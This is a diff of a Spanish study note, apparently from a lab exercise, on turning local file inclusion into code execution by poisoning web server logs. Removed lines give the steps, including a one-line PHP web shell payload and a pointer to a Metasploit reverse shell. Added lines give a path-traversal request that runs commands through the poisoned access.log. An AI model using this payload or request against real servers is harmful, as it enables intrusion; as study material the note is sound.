@@ -31,12 +31,12 @@ Para que el ataque funcione, se necesita un archivo de log que registre datos co
 
 ### Proceso del Ataque (Paso a Paso)
 
-1. **Identificación:** Confirmar que existe LFI intentando leer archivos del sistema como `/etc/passwd`.
-    
-2. **Verificación de Acceso a Logs:** Comprobar si el LFI permite leer los archivos de log (ej. `access.log` o `auth.log`).
-    
-3. **Inyección (Envenenamiento):** Enviar una petición maliciosa que contenga código PHP simple, como `<?php system($_GET['c']); ?>`.
-    
-4. **Ejecución:** Acceder al log vía LFI y pasar el comando deseado por el nuevo parámetro (ej. `&c=ifconfig`).
-    
-5. **Escalada Final:** Usar herramientas como **Metasploit** (módulo `web_delivery`) para obtener una **Shell Inversa** y control total
+- Interceptar la petición con [[Burp Suite]].
+- Modificamos el parámetro **User-Agent** con un código malicioso.
+![[Pasted image 20260210191441.png]]
+![[Pasted image 20260210191651.png]]
+- Ejecutar comandos mediante LFI.
+
+```
+vulnerabilities/fi/?page=../../../../../../var/log/apache2/access.log&cmd=hostname
+```
